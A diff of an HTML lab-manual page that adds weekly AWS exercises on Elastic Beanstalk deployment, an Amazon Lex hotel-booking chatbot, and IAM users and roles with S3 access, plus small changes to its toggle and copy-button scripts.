+      <div class="section">
+        <div class="label">Part C &mdash; Deploy to Elastic Beanstalk</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Open AWS Console &rarr; search for <strong>Elastic Beanstalk</strong> &rarr; click <strong>Create application</strong>. Name: <code>NotesApp</code>. Add an optional description. Click <strong>Create</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Click on the application &rarr; <strong>Create new environment</strong>. Select platform: <strong>Tomcat</strong>. Upload your <code>.war</code> file. Leave remaining settings as default &rarr; click through <strong>Next</strong> and <strong>Create</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Wait for the environment to reach <strong>Ready</strong> state. Click the <strong>Domain link</strong> to open your deployed application.</span></li>
+        </ul>
+        <div class="output">
+          <div class="output-line">Application live at: http://notesapp-env.eba-xxxxxxxx.us-east-1.elasticbeanstalk.com</div>
+          <div class="output-line note">EC2 instances are automatically created and managed by Elastic Beanstalk</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Conclusion</div>
+        <div class="conclusion">
+          <p>A Java web application was developed and tested locally on Apache Tomcat, exported as a WAR file, and deployed to AWS Elastic Beanstalk. Beanstalk automatically provisioned the underlying EC2, load balancer, and scaling infrastructure without manual configuration.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- WEEK 11 -->
+  <div class="week" id="w11" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W11</div>
+      <div class="week-title-wrap">
+        <div class="week-title">Amazon Lex &mdash; Hotel Booking Chatbot</div>
+        <div class="week-sub">Amazon Lex &middot; Intents &middot; Slots &middot; Slot Types &middot; Utterances</div>
+      </div>
+      <div class="week-arrow">&#9662;</div>
+    </div>
+    <div class="week-body">
+
+      <div class="section">
+        <div class="label">Objective</div>
+        <p>Build a conversational chatbot using Amazon Lex that can handle hotel booking requests, collect user information via slots, and provide confirmation responses.</p>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 1 &mdash; Create the Bot</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Search for <strong>Amazon Lex</strong> &rarr; choose <strong>Create a blank bot</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Bot name: <code>HotelBookingBot</code>. IAM role: <strong>Create new role</strong>. Leave remaining settings as default. Click <strong>Next</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Language: <strong>English</strong>. Voice: optional. Click <strong>Done</strong>.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 2 &mdash; Create Intent and Utterances</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Go to <strong>Intents &rarr; Add intent</strong>. Name: <code>BookHotel</code>. Click <strong>Create</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Add sample utterances (phrases the user might say to trigger this intent):</span></li>
+        </ul>
+        <div class="output">
+          <div class="output-line">I want to book a hotel</div>
+          <div class="output-line">Book a room</div>
+          <div class="output-line">Reserve hotel</div>
+          <div class="output-line">I need a room</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 3 &mdash; Add Slots (Data Collection)</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Click <strong>Add slot</strong>. Slot name: <code>location</code>. Slot type: <code>AMAZON.City</code>. Prompt: <em>Which city do you want?</em>. Mark as <strong>Required</strong>. Click <strong>Add</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Click <strong>Slot Types &rarr; Add slot type &rarr; Add blank slot type</strong>. Name it <code>RoomType</code>. Add values: <code>single</code>, <code>double</code>, <code>suite</code>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Return to the <code>BookHotel</code> intent &rarr; <strong>Add slot</strong>. Slot name: <code>RoomType</code>. Slot type: <code>RoomType</code> (the custom type just created).</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Click <strong>Advanced options</strong> on the RoomType slot &rarr; <strong>Slot prompts &rarr; More prompt options &rarr; Add &rarr; Add card groups</strong>. Add card title and buttons with values <code>single</code>, <code>double</code>, <code>suite</code>. Click <strong>Update prompts</strong>.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 4 &mdash; Configure Responses</div>
+        <div class="code-block"><pre><span class="cm">Initial Response:</span>
+<span class="str">Welcome to Hotel Booking! What is your name?</span>
+
+<span class="cm">Confirmation prompt:</span>
+<span class="str">Do you want to confirm booking in {location} for {nights} nights?</span></pre></div>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 5 &mdash; Build and Test</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Click <strong>Save intent</strong> &rarr; click <strong>Build</strong>. Wait for the build to complete.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Click <strong>Test</strong>. The chat panel opens. Type a booking utterance and follow the conversation flow to verify slots are collected correctly.</span></li>
+        </ul>
+        <div class="output">
+          <div class="output-line">Bot: Welcome to Hotel Booking! What is your name?</div>
+          <div class="output-line">User: I want to book a hotel</div>
+          <div class="output-line">Bot: Which city do you want?</div>
+          <div class="output-line note">Slots are filled sequentially with each user response</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Conclusion</div>
+        <div class="conclusion">
+          <p>A hotel booking chatbot was built with Amazon Lex using intents, utterances, and custom slot types. The bot collected city, room type, and other booking details through a guided conversation, demonstrating AWS Lex for building conversational AI interfaces without any ML expertise.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- WEEK 12 -->
+  <div class="week" id="w12" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W12</div>
+      <div class="week-title-wrap">
+        <div class="week-title">IAM User with Permissions &mdash; GUI and CLI Access</div>
+        <div class="week-sub">IAM &middot; IAM User &middot; Access Keys &middot; AWS CLI &middot; Policy Enforcement</div>
+      </div>
+      <div class="week-arrow">&#9662;</div>
+    </div>
+    <div class="week-body">
+
+      <div class="section">
+        <div class="label">Objective</div>
+        <p>Create an IAM user with limited S3 permissions, verify access control through the AWS Console GUI, then configure AWS CLI with the user's credentials and confirm the same policy restrictions apply programmatically.</p>
+      </div>
+
+      <div class="section">
+        <div class="label">Part A &mdash; Create IAM User</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Log in as <strong>Root User</strong> &rarr; search for <strong>IAM</strong> &rarr; go to <strong>Users &rarr; Create user</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Enter a username. Check <strong>Provide user access to the AWS Management Console</strong>. Set a custom password. Click <strong>Next</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Permissions: select <strong>Attach policies directly</strong>. Search for and select <code>AmazonS3FullAccess</code>. Click <strong>Next &rarr; Create user</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">On the final page, click <strong>Download .csv file</strong>. This file contains the Console URL, username, and password.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Part B &mdash; Test GUI Access (Console Login)</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Sign out from root. Use the sign-in URL from the CSV (or go to <code>console.aws.amazon.com</code> &rarr; select <strong>IAM User</strong>). Enter the Account ID, username, and password from the CSV.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text"><strong>Test 1 (Failure):</strong> Navigate to <strong>EC2</strong>. Attempt to view instances. Result: <strong>Access Denied</strong> &mdash; EC2 permission is not granted.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text"><strong>Test 2 (Success):</strong> Navigate to <strong>S3</strong>. Create a bucket. Result: <strong>Success</strong> &mdash; S3 full access is granted by the attached policy.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Part C &mdash; Create Access Keys and Configure AWS CLI</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Log back in as root &rarr; IAM &rarr; select the user &rarr; <strong>Security credentials &rarr; Access keys &rarr; Create access key</strong>. Select use case: <strong>Command Line Interface</strong>. Acknowledge warning &rarr; click <strong>Next &rarr; Create access key</strong>. Download the CSV.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Install the <strong>AWS CLI</strong> tool from <code>aws.amazon.com/cli</code>.</span></li>
+        </ul>
+        <div class="code-header"><span class="code-label">CMD / PowerShell</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cm"># Configure CLI with access key credentials</span>
+<span class="cmd">aws configure</span>
+<span class="cm"># Enter: Access Key ID, Secret Access Key, Default region (ap-south-1), Output format (json)</span>
+
+<span class="cm"># Test S3 access (should succeed)</span>
+<span class="cmd">aws s3 ls</span>
+
+<span class="cm"># Create an S3 bucket (should succeed)</span>
+<span class="cmd">aws s3 mb s3://your-unique-bucket-name</span>
+
+<span class="cm"># Test IAM access (should fail - Access Denied)</span>
+<span class="cmd">aws iam list-users</span></pre></div>
+        <div class="output">
+          <div class="output-line">aws s3 ls            -- Success: lists buckets</div>
+          <div class="output-line">aws s3 mb s3://...   -- Success: bucket created</div>
+          <div class="output-line">aws iam list-users   -- Error: AccessDenied</div>
+          <div class="output-line note">CLI enforces the same IAM policy as the Console GUI</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Conclusion</div>
+        <div class="conclusion">
+          <p>An IAM user was created with S3-only permissions. Access control was verified through both the Console GUI (EC2 denied, S3 allowed) and the AWS CLI (IAM listing denied, S3 operations allowed). This confirms that IAM policies apply consistently across all access methods.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- WEEK 13 -->
+  <div class="week" id="w13" onclick="toggle(this)">
+    <div class="week-header">
+      <div class="week-num">W13</div>
+      <div class="week-title-wrap">
+        <div class="week-title">Attach IAM Role to EC2 for S3 Access Without Keys</div>
+        <div class="week-sub">IAM Role &middot; EC2 Instance Profile &middot; S3 &middot; Keyless Access</div>
+      </div>
+      <div class="week-arrow">&#9662;</div>
+    </div>
+    <div class="week-body">
+
+      <div class="section">
+        <div class="label">Objective</div>
+        <p>Create an IAM Role with S3 permissions and attach it to an EC2 instance so the instance can access S3 without storing any access keys on the machine.</p>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 1 &mdash; Create IAM Role</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Search for <strong>IAM</strong> &rarr; <strong>Roles &rarr; Create role</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Trusted entity: <strong>AWS Service</strong>. Use case: <strong>EC2</strong>. Click <strong>Next</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Search for and select <code>AmazonS3FullAccess</code> policy. Click <strong>Next</strong>.</span></li>
+          <li class="step"><span class="step-n">04</span><span class="step-text">Role name: <code>EC2-S3-Role</code>. Click <strong>Create role</strong>.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 2 &mdash; Launch EC2 and Attach Role</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">01</span><span class="step-text">Go to <strong>EC2 Dashboard &rarr; Launch Instance</strong>. Name the instance and use default settings. Click <strong>Launch instance</strong>.</span></li>
+          <li class="step"><span class="step-n">02</span><span class="step-text">Select the running instance &rarr; <strong>Actions &rarr; Security &rarr; Modify IAM role</strong>.</span></li>
+          <li class="step"><span class="step-n">03</span><span class="step-text">Select <code>EC2-S3-Role</code> from the dropdown &rarr; click <strong>Update IAM role</strong>.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Step 3 &mdash; Verify S3 Access from EC2 (No Keys Required)</div>
+        <div class="code-header"><span class="code-label">SSH &mdash; EC2 Instance</span><button class="copy-btn" onclick="copyBlock(this)">Copy</button></div>
+        <div class="code-block"><pre><span class="cm"># List all S3 buckets - works without aws configure</span>
+<span class="cmd">aws s3 ls</span>
+
+<span class="cm"># Access is granted via the attached IAM role, no access keys needed</span></pre></div>
+        <div class="output">
+          <div class="output-line">2024-01-15 10:32:45 my-bucket-name</div>
+          <div class="output-line">2024-02-20 08:14:22 another-bucket</div>
+          <div class="output-line note">S3 access works without storing any credentials on the instance</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="label">Why IAM Roles Are Better Than Access Keys</div>
+        <ul class="steps">
+          <li class="step"><span class="step-n">Key</span><span class="step-text"><strong>No credentials stored on disk</strong> &mdash; access keys in files can be leaked via repository commits, logs, or server compromise.</span></li>
+          <li class="step"><span class="step-n">Key</span><span class="step-text"><strong>Automatic credential rotation</strong> &mdash; IAM role credentials are temporary and rotated automatically by AWS STS.</span></li>
+          <li class="step"><span class="step-n">Key</span><span class="step-text"><strong>Scoped access</strong> &mdash; the role only grants exactly the permissions defined in the attached policy, following least-privilege principle.</span></li>
+        </ul>
+      </div>
+
+      <div class="section">
+        <div class="label">Conclusion</div>
+        <div class="conclusion">
+          <p>An IAM Role with S3 full access was created and attached to an EC2 instance as an instance profile. The instance successfully accessed S3 using <code>aws s3 ls</code> without requiring any access keys to be configured, demonstrating the secure and recommended approach to granting AWS service permissions to EC2 instances.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
 
 </div>
 
 <script>
   function toggle(el) {
-    el.classList.toggle('open');
+    if (el.classList.contains('week')) {
+      el.classList.toggle('open');
+    }
   }
-  document.querySelectorAll('.exp-body').forEach(b => {
+
+  document.querySelectorAll('.week-body').forEach(b => {
     b.addEventListener('click', e => e.stopPropagation());
   });
-  function copyPre(btn) {
-    const section = btn.closest('.section');
-    const pre = section ? section.querySelector('pre') : null;
-    if (!pre) return;
-    navigator.clipboard.writeText(pre.innerText.trim()).then(() => {
-      btn.textContent = 'COPIED !';
-      btn.classList.add('copied');
-      setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 2000);
-    });
-  }
+
   document.querySelectorAll('a[href^="#"]').forEach(a => {
     a.addEventListener('click', e => {
       e.preventDefault();
@@ -1768,6 +1403,17 @@ HTTP Proxy: 127.0.0.1   Port: 8080 -&gt; OK
       if (t) t.scrollIntoView({ behavior: 'smooth', block: 'start' });
     });
   });
+
+  function copyBlock(btn) {
+    const section = btn.closest('.section');
+    const pre = section ? section.querySelector('pre') : null;
+    if (!pre) return;
+    navigator.clipboard.writeText(pre.innerText.trim()).then(() => {
+      btn.textContent = 'Copied';
+      btn.classList.add('done');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('done'); }, 2000);
+    });
+  }
 </script>
 
 </body>
